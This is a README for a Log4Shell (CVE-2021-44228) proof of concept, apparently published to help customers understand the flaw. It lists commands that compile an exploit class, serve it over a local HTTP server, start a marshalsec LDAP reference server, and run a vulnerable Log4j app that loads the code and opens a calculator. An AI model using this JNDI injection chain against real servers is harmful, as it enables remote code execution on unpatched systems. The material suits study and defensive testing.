# CVE-2021-44228 (Log4Shell) Proof of Concept

Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.
An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

To help customers understand how this flaw works, we prepared this repo with a simple yet working Proof of Concept.

## Prerequisites

Having installed locally:

- Git
- JDK 11
- Maven
- Python

## 

Clone this repo

```console
terminal1 $ git clone https://github.com/sunnyvale-it/CVE-2021-44228-PoC.git
```

Compile the exploit (using JDK 11)

```console
terminal1 $ javac Exploit.java
```

Run a HTTP server to serve the exploit

```console
terminal1 $ python -m SimpleHTTPServer 8888 --directory .
```

Start the LDAPRefServer (thanks to https://github.com/mbechler/marshalsec)

```console
terminal2 $ java -cp tools/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

Launch the buggy application (containing log4j 2.1.x)

```console
terminal3 $ mvn package && mvn exec:exec
```

If everything went fine, a calculator (arbitrary code execution) should popup
